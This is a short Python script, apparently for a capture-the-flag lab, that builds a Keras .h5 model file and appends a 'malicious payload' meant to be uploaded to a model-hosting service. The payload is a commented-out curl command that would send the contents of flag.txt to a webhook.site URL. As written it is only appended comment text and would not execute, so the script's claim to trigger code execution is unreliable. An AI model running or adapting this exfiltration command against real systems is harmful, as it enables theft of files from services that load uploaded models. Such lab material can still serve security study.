#!/usr/bin/env python3
"""
Script to create a malicious .h5 model file with embedded payload
This simulates how an attacker might embed RCE payloads in model files
"""

import numpy as np
import tensorflow as tf
from tensorflow import keras
import os

def create_malicious_model():
    """Create a simple model with malicious payload embedded in metadata"""
    
    # Create a simple sequential model
    model = keras.Sequential([
        keras.layers.Dense(10, activation='relu', input_shape=(5,)),
        keras.layers.Dense(1, activation='sigmoid')
    ])
    
    # Compile the model
    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
    
    # Create some dummy data and train briefly
    X = np.random.random((100, 5))
    y = np.random.randint(0, 2, (100, 1))
    model.fit(X, y, epochs=1, verbose=0)
    
    # Save the model to a temporary file first
    temp_file = 'temp_model.h5'
    model.save(temp_file)
    
    # Now we'll modify the saved file to include our payload
    with open(temp_file, 'rb') as f:
        model_data = f.read()
    
    # Embed the malicious payload as a comment in the file
    payload = b"""
    # This is a malicious payload embedded in the model
    # os.system("curl 'http://webhook.site/your-unique-url/?param=$(cat flag.txt)'")
    # The above payload would exfiltrate the flag file contents
    """
    
    # Write the malicious model
    with open('malicious_model.h5', 'wb') as f:
        f.write(model_data)
        f.write(payload)
    
    # Clean up
    os.remove(temp_file)
    
    print("✅ Created malicious_model.h5 with embedded payload")
    print("🚨 This file contains: os.system curl command to exfiltrate flag.txt")
    print("📁 Upload this file to the Mind Flayer Model Lab to trigger the vulnerability")

if __name__ == "__main__":
    create_malicious_model()